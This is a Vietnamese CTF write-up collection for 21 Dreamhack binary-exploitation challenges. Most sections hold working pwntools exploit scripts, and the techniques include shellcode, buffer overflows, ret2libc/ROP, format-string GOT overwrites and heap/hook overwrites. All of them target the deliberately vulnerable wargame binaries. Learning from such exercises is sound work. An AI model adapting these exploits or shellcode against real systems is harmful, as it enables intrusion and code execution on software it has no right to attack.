--- 
title: Dreamhack writeup
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
published: false

---

1 . bof
------------
 
 reverse : 
 
 có 1 lỗi BOF như tên bài ở biến v4
 
 ![image](https://hackmd.io/_uploads/B1wRFr_m1x.png)

ở hàm read_cat này thì nó open file biến cat chứa ‘./cat’   từ v5 làm đối số , mở file và đọc 

—> overflow v5 bằng flag , từ đó nó sẽ đọc flag cho ta

script :

```
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./bof',checksec=False)
p =process(exe.path)
p = remote('host3.dreamhack.games', 12255)
payload = b'a'*128
payload += b'flag'
p.sendline(payload)
p.interactive()
```

-----------

2 . shell-basic
------------

check IDA : ta thấy nó kêu ta nhập shellcode vì vậy rất có thể là ret2shell , tuy nhiên nó ngăn ta thực thi execve , vậy chỉ còn cách mở file và đọc flag



![image](https://hackmd.io/_uploads/SyrBcBd7ye.png)


![image](https://hackmd.io/_uploads/SJXIqrOXyl.png)

```
; filename : shellcode.asm
section .text
global _start
_start:

        ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)
        xor rax, rax
        push rax                               ; *rsp = \x0
        mov rax, 0x676e6f6f6f6f6f6f             ; rax = "oooooong"
        push rax                                ; *rsp = "oooooong\x0"
        mov rax, 0x6c5f73695f656d61             ; rax = "ame_is_l"
        push rax                                ; *rsp = "ame_is_loooooong\x0"
        mov rax, 0x6e5f67616c662f63             ; rax = "c/flag_n"
        push rax                                ; *rsp = "c/flag_name_is_loooooong\x0"
        mov rax, 0x697361625f6c6c65             ; rax = "ell_basi"
        push rax                                ; *rsp = "ell_basic/flag_name_is_loooooong\x0"
        mov rax, 0x68732f656d6f682f             ; rax = "/home/sh"
        push rax                                ; *rsp = "/home/shell_basic/flag_name_is_loooooong\x0"
        mov rdi, rsp                            ; rdi = rsp ; *rdi = "/home/shell_basic/flag_name_is_loooooong\x0"        xor rsi, rsi                            ; rsi = 0
        xor rdx, rdx                            ; rdx = 0
        mov rax, 0x02                           ; rax = 0x02 ; syscall_open
        syscall

        ; read(fd, buf, 0x30)
        mov rdi, rax                            ; rdi = rax ; *rdi = "DH{...}"
        mov rsi, rsp                            ; rsi = rsp
        sub rsi, 0x30                           ; rsi = rsi - 0x30
        mov rdx, 0x30                           ; rdx = 0x30
        mov rax, 0x00                           ; rax = 0x00 ; syscall_read
        syscall

        ; write(1, buf, 0x30)
        mov rdi, 0x01                           ; rdi = 1
        mov rax, 0x01                           ; rax = 0x01
        syscall
```


```

$ nasm -f elf64 shellcode.asm
$ for i in $(objdump -d shellcode.o|grep "^ "|cut -f2);do echo -n \\x$i;done
\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05
```

cách 2 dùng pwntools :
```
from pwn import * 
context.log_level = "debug" 
r = remote("host1.dreamhack.games", 11033) 
context(arch='amd64', os='linux')
sh = pwnlib.shellcraft.cat("/home/shell_basic/flag_name_is_loooooong", fd=1)


r.sendlineafter("shellcode: ", asm(sh))
r.recvline()
r.interactive()
```

đọc thêm 

```
from pwn import *

p = remote('host1.dreamhack.games', 10499)

context(arch="amd64", os="linux")

p.recvuntil('shellcode: ')

payload = ""
payload += shellcraft.pushstr("/home/shell_basic/flag_name_is_loooooong")
payload += shellcraft.open("rsp",0,0)
payload += shellcraft.read("rax", "rsp", 36)
payload += shellcraft.write(1, "rsp", 36)

p.sendline(asm(payload))
print(p.recv(4096))
```


```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./shell_basic',checksec=False)
context.arch = "amd64"

#p = process(exe.path)
p = remote('host3.dreamhack.games',18971)

io = '/home/shell_basic/flag_name_is_loooooong'

shellcode = shellcraft.open(io)
shellcode += shellcraft.read('rax','rsp',0x80)
shellcode += shellcraft.write(1,'rsp', 0x80)    
    
payload = asm(shellcode)

p.sendafter(b'shellcode: ',payload)

p.interactive()


write dc truyền tham số lần lượt là 1, con trỏ, size
read thì dc truyền 0x0, con trỏ, size nhưng nếu arg1 truyền 0x0 thì ta phải thao tác thêm tham số bên ngoài nên arg1 truyền thành thanh ghi rax luôn
open thì chắc cần truyền đường dẫn file
con trỏ nên là rsp (…stack pointer)
ngoài ra ta phải định dạng kiến trúc hợp ngữ asm là amd64 trong script
```

----------


3 . stupid_gcc
------

source code : 

- vòng lặp đầu  đầu  : so sánh mảng v4[v1] với giá trị lớn nhất kiểu uint16 và v1 có bé hơn 10 không
- sau đó tăng v1
- in giá trị v4[v1] và địa chỉ của v4[v1]
- cộng v2 với v1
- cần bypass v2>1000

![image](https://hackmd.io/_uploads/rkcJjHdmJx.png)


- bug xuất hiện khi complie , ta cần làm sao để v2>10000 ( khá bất khả thi hoặc mình chưa có ý tưởng … )
- vì vậy kh thể compile rồi chạy bình thường , phải có cái gì đó hmmmmmm
- ta tìm ở man gcc thì thấy option D có thể define lại biến

![image](https://hackmd.io/_uploads/B1pzjBO7kx.png)


- vậy ssh tới và làm thôiiii
- ssh -p (port)  name@host
- vì v2 = 0  —> v2=v2+=v2>10000 , nó sẽ so sánh trước ,false nên = 0 —→> v2 = v2+0 và ta có flag


![image](https://hackmd.io/_uploads/rkzrjr_mkx.png)


còn 1 cách khác nữa là Some conditional statements evaporate when using compiler optimization , nó sẽ loại bớt những điều kiện hiển nhiên , ví dụ :

```
v2 = 5
if(v2>3)  -->> sẽ bị loại bỏ khi dùng gcc


```

→ đọc thêm ở đây : https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html

gcc a.c -O2  —>> get flag

---------

4 . awesome-basics
-------

reverse: 

malloc → gán cho flag 

open file → fd = 3

bug ở v5 , khi mở file thì nó return null và gán cho v5 

- có bof nên ta sẽ ghi đè v5 = 1

![image](https://hackmd.io/_uploads/B1hshB_m1e.png)


vậy cần ghi đè cho biến v5 = 1 → nó sẽ in flag ra 

![image](https://hackmd.io/_uploads/rJ923B_m1g.png)

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall',checksec=False)

p = remote('host3.dreamhack.games', 22148)

p.sendafter(b'Your Input: ',b'a'*80+p64(1))

p.interactive()
```


------


5 . Return Address Overwrite
--------

chỉ là 1 bài ret2win đơn giản 

```

#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./rao',checksec=False)
p = process()
p = remote('host3.dreamhack.games', 20393)
payload = b'a'*0x30 +b'a'*0x8
payload += p64(exe.sym.get_shell)
p.sendlineafter(b'Input: ',payload)

p.interactive()
````

------------


6 . cmd_center
-------

BOF + command injection

![image](https://hackmd.io/_uploads/rk5EaSOQyx.png)

ta sẽ overwrite s1 bằng chuỗi 'ifconfig' + bug  command injection

![image](https://hackmd.io/_uploads/rkJs6BOQke.png)

------------


7 . basic_heap_overflow
---------

reverse : 

malloc cho v4 ( 0x20 ) , malloc 1 con trỏ trỏ tới 1 struct (0x20)

- gán con trỏ hàm table_func cho v5
- scanf ( có BOF )

![image](https://hackmd.io/_uploads/Sk4S0S_7yl.png)

sẽ có heap over flow ở bài này như tên bài đã nói

v4 và v5 được khởi tạo kế nhau → overflow v5 trỏ đến hàm get_shell

script :

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./basic_heap_overflow')
#p = process()
p = remote('host3.dreamhack.games', 16275)
#payload = b'a'*32 
#payload += b'ifconfig ;cat flag'
#p.sendlineafter(b'name: ',payload)
payload =b'a'*40
payload += p32(exe.sym.get_shell)
p.sendline(payload)
p.interactive()
```


có 1 điều cần lưu ý là ta đang debug với 64bit , khi malloc nó sẽ + với heap meta data là 16bytes , còn sever chỉ là 8bytes nên cần canh chỉnh sao cho hợp lý


-----------


8 . Return to Library
--------------

1 bài ret2system basic

reverse :


- bug ở read + printf("%s") , nó sẽ leak cho ta canary , libc ………

![image](https://hackmd.io/_uploads/HyqqASuQ1x.png)

Exploit :

- leak canary
- ret2system
- vì hàm system có sẵn nên kh cần leak libc


script :
```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./rtl',checksec=False)
libc = exe.libc
#p = process()
p = remote('host3.dreamhack.games', 16666)
#payload = b'a'*32 
#payload += b'ifconfig ;cat flag'
#p.sendlineafter(b'name: ',payload)
#p.recvuntil(b'a'*57)
#leak = p.recv(7)
#leak = int(leak,16)
#print(hex(leak))
payload =b'a'*56
payload += b'|'
p.sendafter(b'Buf: ',payload)
p.recvuntil(b'|')
leak = u64(b'\0'+ p.recv(7))
print("leak: ",hex(leak))
payload = b'a'*56
payload += p64(leak)
payload += p64(0)
payload += p64(0x0000000000400285)
payload += p64(0x0000000000400853)  #pop rdi
payload += p64(0x400874)
payload += p64(0x4005d0)
p.sendlineafter(b'Buf: ',payload)

#gdb.attach(p)
p.interactive()
```

----------


9 . out_of_bound
-----


chương trình sẽ thực thi command idx , vì vậy ta cần lưu địa chỉ chứa chuỗi cat flag ở command[idx] để system gọi đến 

![image](https://hackmd.io/_uploads/B1Ey1UdQ1g.png)

ta thấy nó sẽ tính toán idx ở đây , 

name = 0x0804a0ac , vì mảng 32bit là 4 bytes nên cần /4

![image](https://hackmd.io/_uploads/SyP-yUdQyx.png)

![image](https://hackmd.io/_uploads/SyefkL_Q1l.png)

script :

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./out_of_bound',checksec=False)
p = process()
#p = remote('host3.dreamhack.games', 9564)
#payload = b'a'*32 
#payload += b'ifconfig ;cat flag'
#p.sendlineafter(b'name: ',payload)
#p.recvuntil(b'a'*57)
#leak = p.recv(7)
#leak = int(leak,16)
#print(hex(leak))
gdb.attach(p,gdbscript='''
           b*main+66
           b*main+97
           ''')
input()
payload = p32(0x0804a0ab0)
payload += b'cat flag'
p.sendafter(b'name: ',payload)

p.sendlineafter(b'want?: ',b'19')
#gdb.attach(p)
p.interactive()
```

1 điều cần lưu ý là , nếu nhập add (name+0) thì nó chỉ ghi cat , đó là vì Là kết quả của việc thực thi chương trình theo luồng thông thường, eax trong hàm hệ thống chứa địa chỉ của chuỗi sẽ được thực thi. Trong trường hợp trước, **lệnh không được thực thi vì chuỗi được nhập trực tiếp vào eax** .

![image](https://hackmd.io/_uploads/Hy4tJ8O71l.png)
tham khảo : [e_yejun [Dreamhack] out of bound - write up](https://she11.tistory.com/141)


---------------


10 . mmapped
-------

reverse :

bài cho ta khá nhiều thông tin : real_flag_addr(target) , buf_add , fake_flag 

bug ở read → BOF

![image](https://hackmd.io/_uploads/SkKakL_71e.png)


debug :

ta có thể overlow add của fake flag → real_flag

script 

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./chall',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 19794)
p.recvline()
p.recvline()
p.recvuntil(b': ')
leak = p.recvline()[:-1]
#leak = p.recvline(keepends=False)
leak = int(leak,16)
print(hex(leak))
payload =b'a'*48
payload += p64(leak)
p.sendafter(b'input: ',payload)
p.interactive()
```

---------


11 . one_shot
--------

- chỉ là 1 bài one_gadget và được cho libc sẵn

![image](https://hackmd.io/_uploads/rkFblLOQkx.png)

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

#p = process(exe.path)
p = remote('host3.dreamhack.games', 13138)
p.recvuntil(b'stdout: ')
leak = (p.recvline()[:-1].decode())
leak = int(leak,16)
print(leak)

libc.address = leak -3954208
print(hex(libc.address))
payload = b'a'*24
payload += p64(0)
payload = payload.ljust(40,b'a')
payload += p64(libc.address+0x45216)
p.send(payload)
p.interactive()
```

- nếu ta ghi tới save_rbp rồi p64(one_gadget) thì bị EOF do ta chưa kiểm tra thanh ghi rax có NULL hay không
- -ta chỉ cần thêm 8 byte thay vì 16 byte để tới save_rbp(tại tới save_rbp là thanh ghi rax sẽ chỉ định tới __libc_start_call_main+128)

script 

```
#!/usr/bin/python
from pwn import *

r = process('./oneshot', env = {'LD_PRELOAD':'./libc.so.6'})
r = remote('host1.dreamhack.games', 8257)
lib = ELF('./libc.so.6')

_leak = int(r.recvline().split(': ')[1], 16)
_libc = _leak - lib.sym['_IO_2_1_stdout_']

success('libc base = ' + hex(_libc))

one_shot = ['0x45216', '0x4526a', '0xf02a4', '0xf1147']
_one_shot = _libc + int(one_shot[3], 16)

payload = 'A'*0x18
payload += p64(0x0)
payload += p64(_one_shot)*2

r.sendlineafter('MSG: ', payload)

r.interactive()
```


12 . hook
-------


- bài này thuộc hook overwrite giống với bài fho , ta được ghi size thoải mái → bof
- ta thấy được hàm system , tuy nhiên vì bug double free nên chưa thực thi dc system là sẽ bị lỗi
- cần chú ý đến đoạn gán buf+1 cho buf ( buf ở đây là 8 bytes ) → ta có thể hookoverwrite để free(buf) thành system(’/bin/sh’) cho ta

![image](https://hackmd.io/_uploads/SyN3g8_Xkl.png)


script

```
#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./hook',checksec=False)
libc = ELF('./libc-2.23.so')
#p = process()
p = remote('host3.dreamhack.games', 18058)
p.recvuntil(b'dout: ')
leak = int(p.recvline()[:-1],16)
print("leak stdou: ",hex(leak))
libc.address = leak - libc.sym._IO_2_1_stdout_
print("libc address: ",hex(libc.address))
p.sendlineafter(b'Size: ',str(100))
payload = p64(libc.sym.__free_hook)
payload += p64(libc.address+0x4527a)  -> có thể thay bằng system trong exe
p.sendafter('Data: ',payload)
p.interactive()
```

-------------------


13 . format string bug
---------

bài này chỉ lần leak PIE và thay đổi giá trị của địa chỉ 

![image](https://hackmd.io/_uploads/B1XJbL_m1e.png)

script 

```
#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./fsb_overwrite')
p=process(exe.path)
p = remote('host3.dreamhack.games', 9913)
#leak PIE
payload = b'%22$p'
p.send(payload)
leak = int(p.recvline()[:-1],16)
exe.address = leak -15760
print("exe address: ",hex(exe.address))
change_me = exe.address + 16412
print("change_me: ",hex(change_me))
a = 1337
payload = f'%{a}c%9$hn'.encode()
payload = payload.ljust(0x18,b'a')
payload += p64(change_me)
input()
p.send(payload)
p.interactive()
```

---------

14. basic_exploit_002
------

chỉ là 1 bài ghi đè exit bằng get_shell

script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./a',checksec=False)
p = process(exe.path)
p = remote('host3.dreamhack.games', 9079)
system =  exe.sym.get_shell
print("system: ",hex(system))
sys = system & 0xffff
exit_ = exe.got.exit
print("win: ",hex(sys))
print("exit: ",hex(exit_))

payload = p32(exit_)
payload += f'%{sys-4}c%1$hn'.encode()
input()
p.send(payload)
p.interactive()
```

cách 2  
```
from pwn import *

x = process('./basic_exploitation_002')
x = remote('host1.dreamhack.games', 8202)
e = ELF('./basic_exploitation_002')

payload = fmtstr_payload(1, {e.got['exit'] : e.symbols['get_shell']})
x.send(payload)

x.interactive()
```

cách 3 

```
from pwn import *

p = remote("host3.dreamhack.games", 22246)
e = ELF("./basic_exploitation_002")

exit_got = e.got['exit']
'''
get_shell = 0x08048609
exit_got + 2  =>  0x0804  =  2052 - 8                  =  2044
exit_got      =>  0x8609  =  34313 - 8 - ( 2052 - 8 )  =  32261

'''
payload = p32(exit_got+2) + p32(exit_got) + "%2044c%1$hn" + "%32261c%2$hn"

p.sendline(payload)

p.interactive()
```

---------

15 . basic_exploit_003
-----

easy nên để script ở đây th 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_exploitation_003')

p= process(exe.path)
P = remote(b'host3.dreamhack.games', 18737)
payload = b'%156c' + p32(exe.sym.get_shell)
p.sendline(payload)
p.interactive()
```

--------------

16 . no mov
------

full giáp : 

![image](https://hackmd.io/_uploads/B1_qb8OX1e.png)

- nôm na bài này là dùng shellcode tuy nhiên nó bị filter lệnh mov → shellcode không dùng move
- vòng lặp dưới đây cho ta thấy được rằng nó sẽ so sánh từng byte với từng bytes mov , nếu đúng thì ctrinh sập

![image](https://hackmd.io/_uploads/B1OsZUOX1x.png)


ở đây ta có thể dùng các lệnh khác như xchg , vòng lặp ,xor , leak , add

script 

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./main',checksec=False)

p = process(exe.path)
p = remote('host3.dreamhack.games', 17395)
shellcode =asm('''
               push rax
               add rbx,1852400175    
               push rbx
               add rsp , 0xc
               xor rbx,rbx
               add rbx,6845231
               push rbx
               lea rdi,[rsp-0x4]
               add rax,0x3b
               syscall
               ''',arch='amd64'
        )
p.sendafter(b' > ',shellcode)
p.interactive()
```

tham khảo writeup : 
```
from pwn import *

context.arch = "amd64"

r = remote("host3.dreamhack.games", 16147)

shellcode = asm('''
xor rax, rax
add rax, 0x3b
xor rbx, rbx
add rbx, 0x68732f
shl rbx, 32
or rbx, 0x6e69622f
push rbx
xor rdi, rdi
add rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
''')

r.sendlineafter("> ", shellcode)

r.interactive()
```

https://dreamhack.io/wargame/writeups/16088

------------

17 . off_by_one_001
-----------

- reverse : 
bài này xảy ra lỗi ở hàm read_str , khi ta nhập 20bytes thì nó sẽ dc lưu vào v3 , và buf[v3] = 0 ( buf[20] = 0 ) thì nó sẽ ghi đè địa chỉ kế tiếp bằng bytes null này 

![image](https://hackmd.io/_uploads/SJDZzIOX1l.png)


![image](https://hackmd.io/_uploads/SkyfGIOXkl.png)


script 
```
#!/usr/bin/python3
from pwn import *
context.binary= exe = ELF('./off_by_one_001',checksec=False)
p = remote('host3.dreamhack.games', 11186)
#p= process()
payload = b'a'*19
input()
p.sendline(payload)

p.interactive()




```

----------


18 . cherry 
-----


reverse :
- ta có thể thấy BOF ở bài này , tuy nhiên thì ta sẽ ghi đè ở đâu?
- bài này chỉ là ret2win , ta có thể thấy size ở lần read thứ 2 có thể overflow được , vì vậy ta sẽ ghi đè làm sao cho lần read thứ 2 xảy ra BOF 1 lần nữa
- size và buf read đầu tiên cách nhau 12bytes ( có thể thấy ở IDA)
- buf ( 6 bytes ) , var_12 (4 bytes ) , var_E ( 2 bytes) = 12 bytes
- oke vậy là xong bài ròi ghi script thôi :3


![image](https://hackmd.io/_uploads/rJxPzIO7Je.png)

script 

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./chall')
p = process()
p = remote('host3.dreamhack.games', 17275)
p.sendafter(b'Menu: ',b'cherry'+b'a'*6+b'Z')
p.sendafter(b'cherry?: ',b'a'*0x12+b'a'*8+p64(exe.sym.flag))

p.interactive()
```

----------

19 . sint
-------

nhìn vào code , ta có thể hiểu nôm na là nếu ta muốn size > 256 hoặc < 0 thì nó sẽ exit ctrinh , và khi ctrinh bị SIGSEGV thì nó sẽ gọi hàm get_shell 

- ok target của bài này có 2 hướng
- BOF và lợi dụng signal()
- khi nhập size = 0 , size_t  sẽ có kiểu unsigned → nếu nhập 0  khi tới read sẽ là size -1 = -1 và nó sẽ read rất nhiều bytes → BOF


script 

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}



```

ta có thể tìm offset và gọi get_shell hoặc ghi 1 lượng lớn bytes vào ctrinh bị SIGSEGV sẽ gọi get_shell

```
#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./sint')

#p = process()
p = remote('host3.dreamhack.games', 11682)
#p = process('')
p.sendline(b'0')
p.sendafter(b'Data: ',b'a'*260 + p32(exe.sym.get_shell))

p.interactive()
```

cách 2 : 

```
#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./sint')

#p = process()
p = remote('host3.dreamhack.games', 11682)
#p = process('')
p.sendline(b'0')
p.sendafter(b'Data: ',b'a'*400)

p.interactive()
```

-----------------

20 . memory leak
------


ta có 3 options ở bài này :

- đầu tiên cần tạo file flag để đọc

![image](https://hackmd.io/_uploads/HJtvVIuQke.png)

nhìn sơ vào thì option2 là print cái mà ta đã nhập ở option1 ra , options 3 thì đọc flag vô stack , option1 thì nhập dữ liệu vào 


sau khi fread :

![image](https://hackmd.io/_uploads/HJF5N8_Q1x.png)


read name :   read vào địa chỉ e50 mà flag ta thì ở e64 , 4 bytes tiếp sẽ là age của ta 

![image](https://hackmd.io/_uploads/B1KsNUumkl.png)

script :

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./memory_leakage')
p = process(exe.path)

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'> ',b'1')
gdb.attach(p,gdbscript='''
           b*main+190
           b*main+229
           b*main+251
           b*main+271
           ''')
input()
p.sendafter(b'Name: ',b'a'*16)
p.sendlineafter(b'Age: ',str(0x12345678))
p.sendlineafter(b'> ',b'2')



p.interactive()
```

![image](https://hackmd.io/_uploads/Hyu6VLOQJe.png)


---------------




21 . arm-training v1
---------

1 bài ret2win ARM

![image](https://hackmd.io/_uploads/SyixHIuQJx.png)

script 

```

#!/usr/bin/python3
from pwn import *

context.binary =  exe = ELF('./arm_training-v1')
p = remote('host3.dreamhack.games', 10591)
#p = process()
p.send(b'a'*24 + p32(exe.sym.shell))
p.interactive()
```
